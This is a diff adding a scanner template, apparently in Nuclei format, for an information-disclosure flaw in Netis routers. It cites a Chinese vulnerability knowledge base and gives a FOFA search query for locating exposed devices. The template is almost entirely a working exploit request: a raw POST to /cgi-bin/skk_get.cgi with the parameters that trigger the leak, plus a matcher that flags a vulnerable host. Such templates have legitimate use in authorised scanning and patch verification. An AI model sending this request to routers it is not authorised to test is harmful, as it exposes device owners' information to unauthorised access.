@@ -1,0 +1,31 @@
+id: poc-dmuvnntg6umgbeic
+info:
+  name: Netis路由器skk_get.cgi信息泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dmuvnntg6umgbeic'
+  tags: info-leak,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: dmuvnntg6umgbeic
+    fofa: app="netis-Server"
+http:
+- raw:
+  - 'POST /cgi-bin/skk_get.cgi HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:131.0) Gecko/20100101 Firefox/131.0
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 27
+
+    Connection: keep-alive
+
+    mode_name=skk_get&wl_link=0'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
